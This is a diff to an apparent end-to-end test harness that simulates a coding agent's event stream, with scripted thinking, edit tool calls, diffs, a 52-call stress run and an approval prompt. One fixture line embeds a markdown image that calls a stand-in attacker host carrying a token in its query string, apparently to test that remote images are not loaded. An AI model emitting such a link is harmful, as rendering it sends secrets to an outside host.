@@ -137,15 +137,46 @@ function usageFor(output = 1) {
 	};
 }
 
-function assistantMessage(text, timestamp = Date.now()) {
+function assistantMessageWithContent(content, stopReason = "stop", timestamp = Date.now()) {
+	const outputText = content
+		.map((block) =>
+			block.type === "text"
+				? block.text
+				: block.type === "thinking"
+					? block.thinking
+					: JSON.stringify(block.arguments ?? {}),
+		)
+		.join("");
 	return {
 		role: "assistant",
-		content: [{ type: "text", text }],
+		content,
 		api: "openai-completions",
 		provider: "e2e",
 		model: "deterministic",
-		usage: usageFor(Math.max(1, Math.ceil(text.length / 4))),
-		stopReason: "stop",
+		usage: usageFor(Math.max(1, Math.ceil(outputText.length / 4))),
+		stopReason,
+		timestamp,
+	};
+}
+
+function assistantMessage(text, timestamp = Date.now()) {
+	return assistantMessageWithContent([{ type: "text", text }], "stop", timestamp);
+}
+
+function toolResultMessage(
+	toolCallId,
+	details,
+	timestamp = Date.now(),
+	toolName = "edit",
+	text = "\u001b[32mSynthetic edit completed\u001b[0m",
+) {
+	return {
+		role: "toolResult",
+		toolCallId,
+		toolName,
+		content: [{ type: "text", text }],
+		details,
+		isError: false,
 		timestamp,
 	};
 }
@@ -183,6 +214,440 @@ function scheduleSlowFinish(run, text, callback) {
 	check();
 }
 
+function streamComplexPrompt(command, text, user, userEntryId) {
+	const thinking =
+		"\u001b[36mInspecting synthetic workspace\u001b[0m\nComparing the implementation with the requested behavior.";
+	const toolCallId = `${sessionId}-complex-edit`;
+	const toolArgs = {
+		file_path: "src/demo.ts",
+		description: "Normalize status labels",
+	};
+	const toolCall = { type: "toolCall", id: toolCallId, name: "edit", arguments: toolArgs };
+	const diff = [
+		"--- a/src/demo.ts",
+		"+++ b/src/demo.ts",
+		"@@ -1,3 +1,3 @@",
+		" export function formatStatus(status: string) {",
+		"-  return status;",
+		"+  return status.toUpperCase();",
+		" }",
+	].join("\n");
+	const markdown = [
+		"## Synthetic change review",
+		"",
+		"The deterministic fixture exercised a complete coding-agent turn.",
+		"",
+		"- Preserve the public API",
+		"- Normalize the displayed status",
+		"- Keep the change isolated",
+		"",
+		"| Check | Result |",
+		"| --- | --- |",
+		"| Protocol sequence | Verified |",
+		"| Sensitive data | None |",
+		"",
+		"```ts",
+		"export function formatStatus(status: string) {",
+		"  return status.toUpperCase();",
+		"}",
+		"```",
+		"",
+		"![Remote evidence](https://attacker.invalid/leak?secret=SYNTHETIC_TOKEN)",
+		"",
+		"The synthetic edit is settled and ready for review.",
+	].join("\n");
+
+	const run = { command, label: "complex-demo", timers: [], assembled: "", userEntryId };
+	activeRun = run;
+	record("prompt", {
+		commandId: command.id,
+		text,
+		imageCount: 0,
+		imageMimeTypes: [],
+		imageChars: 0,
+		slow: false,
+		complex: true,
+	});
+
+	send({ type: "agent_start" });
+	send({ type: "turn_start", turnIndex: 0, timestamp: Date.now() });
+	send({ type: "message_start", message: user });
+	send({ type: "message_end", message: user });
+	send({ type: "session_info_changed" });
+	send({ type: "message_start", message: assistantMessageWithContent([], "pending") });
+	respond(command);
+
+	schedule(run, 25, () => {
+		let partial = assistantMessageWithContent([], "pending");
+		send({
+			type: "message_update",
+			message: partial,
+			usage: partial.usage,
+			assistantMessageEvent: { type: "thinking_start", contentIndex: 0, partial },
+		});
+		partial = assistantMessageWithContent([{ type: "thinking", thinking }], "pending");
+		send({
+			type: "message_update",
+			message: partial,
+			usage: partial.usage,
+			assistantMessageEvent: { type: "thinking_delta", contentIndex: 0, delta: thinking, partial },
+		});
+		send({
+			type: "message_update",
+			message: partial,
+			usage: partial.usage,
+			assistantMessageEvent: { type: "thinking_end", contentIndex: 0, content: thinking, partial },
+		});
+		send({
+			type: "message_update",
+			message: partial,
+			usage: partial.usage,
+			assistantMessageEvent: { type: "toolcall_start", contentIndex: 1, partial },
+		});
+		const toolArgsText = JSON.stringify(toolArgs);
+		send({
+			type: "message_update",
+			message: partial,
+			usage: partial.usage,
+			assistantMessageEvent: {
+				type: "toolcall_delta",
+				contentIndex: 1,
+				delta: toolArgsText,
+				partial,
+			},
+		});
+		const toolUse = assistantMessageWithContent([{ type: "thinking", thinking }, toolCall], "toolUse");
+		send({
+			type: "message_update",
+			message: toolUse,
+			usage: toolUse.usage,
+			assistantMessageEvent: { type: "toolcall_end", contentIndex: 1, toolCall, partial: toolUse },
+		});
+		send({ type: "message_end", message: toolUse });
+		messages.push(toolUse);
+		const toolUseEntryId = persistMessage(toolUse, userEntryId);
+
+		send({ type: "tool_execution_start", toolCallId, toolName: "edit", args: toolArgs });
+		send({
+			type: "tool_execution_update",
+			toolCallId,
+			toolName: "edit",
+			args: toolArgs,
+			partialResult: { text: "Preparing synthetic diff" },
+		});
+		const result = { content: "Synthetic edit completed", details: { diff } };
+		send({
+			type: "tool_execution_end",
+			toolCallId,
+			toolName: "edit",
+			result,
+			isError: false,
+		});
+		const toolResult = toolResultMessage(toolCallId, { diff });
+		send({ type: "message_start", message: toolResult });
+		send({ type: "message_end", message: toolResult });
+		messages.push(toolResult);
+		const toolResultEntryId = persistMessage(toolResult, toolUseEntryId);
+
+		const emptyFinal = assistantMessageWithContent([], "pending");
+		send({ type: "message_start", message: emptyFinal });
+		send({
+			type: "message_update",
+			message: emptyFinal,
+			usage: emptyFinal.usage,
+			assistantMessageEvent: { type: "text_start", contentIndex: 0, partial: emptyFinal },
+		});
+		const final = assistantMessageWithContent([{ type: "text", text: markdown }], "stop");
+		send({
+			type: "message_update",
+			message: final,
+			usage: final.usage,
+			assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: markdown, partial: final },
+		});
+		send({
+			type: "message_update",
+			message: final,
+			usage: final.usage,
+			assistantMessageEvent: { type: "text_end", contentIndex: 0, content: markdown, partial: final },
+		});
+		send({ type: "message_end", message: final });
+		send({ type: "turn_end", turnIndex: 0, message: final, toolResults: [toolResult] });
+		messages.push(final);
+		persistMessage(final, toolResultEntryId);
+		send({ type: "agent_end", messages: [user, toolUse, toolResult, final], willRetry: false });
+		send({ type: "agent_settled" });
+		record("settled", { commandId: command.id, text, label: "complex-demo" });
+		activeRun = null;
+	});
+}
+
+function stressTool(index) {
+	const ordinal = String(index).padStart(3, "0");
+	const toolName = ["read", "grep", "bash", "edit"][index % 4];
+	const sentinel = `synthetic-tool-${ordinal}`;
+	if (toolName === "read") {
+		return {
+			toolName,
+			args: { file_path: `src/${sentinel}.ts` },
+			details: { lines: 12, synthetic: true },
+		};
+	}
+	if (toolName === "grep") {
+		return {
+			toolName,
+			args: { pattern: sentinel, path: "src" },
+			details: { matches: 1, synthetic: true },
+		};
+	}
+	if (toolName === "bash") {
+		return {
+			toolName,
+			args: { command: `printf '${sentinel}'` },
+			details: { exitCode: 0, synthetic: true },
+		};
+	}
+	const diff = [
+		`--- a/src/${sentinel}.ts`,
+		`+++ b/src/${sentinel}.ts`,
+		"@@ -1 +1 @@",
+		`-export const value = "before-${ordinal}";`,
+		`+export const value = "after-${ordinal}";`,
+	].join("\n");
+	return {
+		toolName,
+		args: { file_path: `src/${sentinel}.ts`, description: sentinel },
+		details: { diff, synthetic: true },
+	};
+}
+
+function emitStressTool(run, index) {
+	const ordinal = String(index).padStart(3, "0");
+	const { toolName, args, details } = stressTool(index);
+	const toolCallId = `${sessionId}-stress-${ordinal}`;
+	const toolCall = { type: "toolCall", id: toolCallId, name: toolName, arguments: args };
+	let partial = assistantMessageWithContent([], "pending");
+	send({ type: "message_start", message: partial });
+	send({
+		type: "message_update",
+		message: partial,
+		usage: partial.usage,
+		assistantMessageEvent: { type: "toolcall_start", contentIndex: 0, partial },
+	});
+	send({
+		type: "message_update",
+		message: partial,
+		usage: partial.usage,
+		assistantMessageEvent: {
+			type: "toolcall_delta",
+			contentIndex: 0,
+			delta: JSON.stringify(args),
+			partial,
+		},
+	});
+	partial = assistantMessageWithContent([toolCall], "toolUse");
+	send({
+		type: "message_update",
+		message: partial,
+		usage: partial.usage,
+		assistantMessageEvent: { type: "toolcall_end", contentIndex: 0, toolCall, partial },
+	});
+	send({ type: "message_end", message: partial });
+	messages.push(partial);
+	run.agentMessages.push(partial);
+	run.parentEntryId = persistMessage(partial, run.parentEntryId);
+
+	send({ type: "tool_execution_start", toolCallId, toolName, args });
+	send({
+		type: "tool_execution_update",
+		toolCallId,
+		toolName,
+		args,
+		partialResult: { text: `Synthetic progress ${ordinal}` },
+	});
+	const content = `Synthetic result ${ordinal}`;
+	send({
+		type: "tool_execution_end",
+		toolCallId,
+		toolName,
+		result: { content, details },
+		isError: false,
+	});
+	const toolResult = toolResultMessage(toolCallId, details, Date.now(), toolName, content);
+	send({ type: "message_start", message: toolResult });
+	send({ type: "message_end", message: toolResult });
+	messages.push(toolResult);
+	run.agentMessages.push(toolResult);
+	run.toolResults.push(toolResult);
+	run.parentEntryId = persistMessage(toolResult, run.parentEntryId);
+}
+
+function stressMarkdown() {
+	let code = "";
+	for (let index = 0; code.length < 70 * 1024; index += 1) {
+		const ordinal = String(index).padStart(4, "0");
+		code += `export const synthetic_line_${ordinal} = "deterministic-${ordinal}";\n`;
+	}
+	return [
+		"## Synthetic stress trajectory",
+		"",
+		"The packaged workbench projected a deliberately large, deterministic coding-agent trajectory.",
+		"",
+		"| Check | Result |",
+		"| --- | --- |",
+		"| Tool sequence | 52 mixed calls |",
+		"| Provider traffic | None |",
+		"| Payload source | Synthetic fixture |",
+		"",
+		"```ts",
+		code,
+		"// STRESS_CODE_END",
+		"```",
+		"",
+		"The long settled response is complete.",
+	].join("\n");
+}
+
+function streamStressPrompt(command, text, user, userEntryId) {
+	const run = {
+		kind: "stress",
+		command,
+		label: "stress-trajectory",
+		timers: [],
+		assembled: "",
+		userEntryId,
+		parentEntryId: userEntryId,
+		agentMessages: [user],
+		toolResults: [],
+	};
+	activeRun = run;
+	record("prompt", {
+		commandId: command.id,
+		text,
+		imageCount: 0,
+		imageMimeTypes: [],
+		imageChars: 0,
+		slow: true,
+		stress: true,
+	});
+
+	send({ type: "agent_start" });
+	send({ type: "turn_start", turnIndex: 0, timestamp: Date.now() });
+	send({ type: "message_start", message: user });
+	send({ type: "message_end", message: user });
+	send({ type: "session_info_changed" });
+	respond(command);
+
+	schedule(run, 25, () => {
+		for (let index = 0; index < 26; index += 1) emitStressTool(run, index);
+		record("stress_checkpoint", { commandId: command.id, text, toolCount: 26 });
+		scheduleSlowFinish(run, text, () => {
+			for (let index = 26; index < 52; index += 1) emitStressTool(run, index);
+			const markdown = stressMarkdown();
+			const pending = assistantMessageWithContent([], "pending");
+			send({ type: "message_start", message: pending });
+			send({
+				type: "message_update",
+				message: pending,
+				usage: pending.usage,
+				assistantMessageEvent: { type: "text_start", contentIndex: 0, partial: pending },
+			});
+			const final = assistantMessageWithContent([{ type: "text", text: markdown }], "stop");
+			send({
+				type: "message_update",
+				message: final,
+				usage: final.usage,
+				assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: markdown, partial: final },
+			});
+			send({
+				type: "message_update",
+				message: final,
+				usage: final.usage,
+				assistantMessageEvent: { type: "text_end", contentIndex: 0, content: markdown, partial: final },
+			});
+			send({ type: "message_end", message: final });
+			send({ type: "turn_end", turnIndex: 0, message: final, toolResults: run.toolResults });
+			messages.push(final);
+			run.agentMessages.push(final);
+			persistMessage(final, run.parentEntryId);
+			send({ type: "agent_end", messages: run.agentMessages, willRetry: false });
+			send({ type: "agent_settled" });
+			record("settled", {
+				commandId: command.id,
+				text,
+				label: "stress-trajectory",
+				toolCount: 52,
+				markdownChars: markdown.length,
+			});
+			activeRun = null;
+		});
+	});
+}
+
+function streamExtensionPrompt(command, text, user, userEntryId) {
+	const requestId = `${sessionId}-synthetic-confirm`;
+	const run = {
+		kind: "extension",
+		command,
+		label: "extension-confirm",
+		timers: [],
+		assembled: "",
+		user,
+		userEntryId,
+		requestId,
+		text,
+	};
+	activeRun = run;
+	record("prompt", {
+		commandId: command.id,
+		text,
+		imageCount: 0,
+		imageMimeTypes: [],
+		imageChars: 0,
+		slow: false,
+		extension: true,
+	});
+	send({ type: "agent_start" });
+	send({ type: "turn_start", turnIndex: 0, timestamp: Date.now() });
+	send({ type: "message_start", message: user });
+	send({ type: "message_end", message: user });
+	send({ type: "session_info_changed" });
+	respond(command);
+	schedule(run, 25, () => {
+		send({
+			type: "extension_ui_request",
+			id: requestId,
+			method: "confirm",
+			title: "Synthetic approval",
+			message: "Continue the synthetic run?",
+		});
+		record("extension_request", { commandId: command.id, text, requestId });
+	});
+}
+
+function finishExtensionPrompt(response) {
+	const run = activeRun;
+	if (run?.kind !== "extension" || response.id !== run.requestId) return;
+	const confirmed = response.confirmed === true;
+	const cancelled = response.cancelled === true;
+	record("extension_response", {
+		commandId: run.command.id,
+		text: run.text,
+		confirmed,
+		cancelled,
+	});
+	const label = confirmed ? "E2E_EXTENSION_CONFIRMED" : "E2E_EXTENSION_CANCELLED";
+	const final = assistantMessage(label);
+	send({ type: "message_start", message: final });
+	send({ type: "message_end", message: final });
+	send({ type: "turn_end", turnIndex: 0, message: final, toolResults: [] });
+	messages.push(final);
+	persistMessage(final, run.userEntryId);
+	send({ type: "agent_end", messages: [run.user, final], willRetry: false });
+	send({ type: "agent_settled" });
+	record("settled", { commandId: run.command.id, text: run.text, label });
+	activeRun = null;
+}
+
 function streamPrompt(command) {
 	const text = typeof command.message === "string" ? command.message : "";
 	const images = Array.isArray(command.images) ? command.images : [];
@@ -193,6 +658,18 @@ function streamPrompt(command) {
 	const user = { role: "user", content: userContent, timestamp: Date.now() };
 	const userEntryId = persistMessage(user, null);
 	messages.push(user);
+	if (text === "E2E_COMPLEX_DEMO" && images.length === 0) {
+		streamComplexPrompt(command, text, user, userEntryId);
+		return;
+	}
+	if (text === "E2E_STRESS_TRAJECTORY" && images.length === 0) {
+		streamStressPrompt(command, text, user, userEntryId);
+		return;
+	}
+	if (text === "E2E_EXTENSION_CONFIRM" && images.length === 0) {
+		streamExtensionPrompt(command, text, user, userEntryId);
+		return;
+	}
 
 	const label =
 		images.length > 0 && !text
@@ -285,6 +762,10 @@ function handleLine(line) {
 	}
 	if (!command || typeof command !== "object" || typeof command.type !== "string") return;
 	if (typeof command.id !== "string") return;
+	if (command.type === "extension_ui_response") {
+		finishExtensionPrompt(command);
+		return;
+	}
 
 	record("command", { commandId: command.id, commandType: command.type });
 	switch (command.type) {
